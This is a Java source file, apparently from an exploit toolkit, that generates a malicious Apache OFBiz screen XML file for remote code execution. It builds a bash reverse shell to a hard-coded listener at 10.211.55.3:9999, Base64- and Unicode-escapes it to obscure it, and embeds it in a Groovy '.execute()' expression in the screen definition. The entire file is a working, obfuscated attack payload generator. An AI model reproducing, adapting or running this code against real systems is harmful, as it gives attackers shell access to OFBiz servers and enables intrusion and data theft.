package org.tyby.javaapacheexp.tools;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class GenerateRCEXML {
    public static void main(String[] args) throws IOException {
        GenerateRCEXML.cenerateRCEXML("10.211.55.3","9999");
    }

    public static void cenerateRCEXML(String ip,String port) {
        try {

            // Step 1: 对 bash 命令进行 Base64 编码
            String command = String.format("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port);
            String base64Encoded = Base64.getEncoder().encodeToString(command.getBytes(StandardCharsets.UTF_8));

            // Step 2: 对 base64 编码的结果进行 Unicode 编码
            String unicodeEncoded = encodeToUnicode("bash -c {echo,"+base64Encoded+"}|{base64,-d}|{bash,-i}");

            // Step 3: 生成 XML 内容
            String xmlContent = generateXML(unicodeEncoded);

            // Step 4: 获取当前工作目录并写入 rce.xml 文件
            String currentDir = System.getProperty("user.dir");
            writeToFile(currentDir + "/rce.xml", xmlContent);
            System.out.println("rce.xml 文件已生成到：" + currentDir);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 生成 XML 内容
    private static String generateXML(String payload) {
        return String.format(
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<screens xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                        "        xmlns=\"http://ofbiz.apache.org/Widget-Screen\" xsi:schemaLocation=\"http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd\">\n\n" +
                        "    <screen name=\"StatsDecorator\">\n" +
                        "        <section>\n" +
                        "            <actions>\n" +
                        "                <set value=\"${groovy:'%s'.execute();}\"/>\n" +
                        "            </actions>\n" +
                        "        </section>\n" +
                        "    </screen>\n" +
                        "</screens>", payload);
    }

    // 将字符串编码为 Unicode
    private static String encodeToUnicode(String input) {
        StringBuilder unicodeString = new StringBuilder();
        for (char c : input.toCharArray()) {
            unicodeString.append(String.format("\\u%04x", (int) c));
        }
        return unicodeString.toString();
    }

    // 将内容写入文件
    private static void writeToFile(String fileName, String content) {
        try (FileWriter writer = new FileWriter(fileName)) {
            writer.write(content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
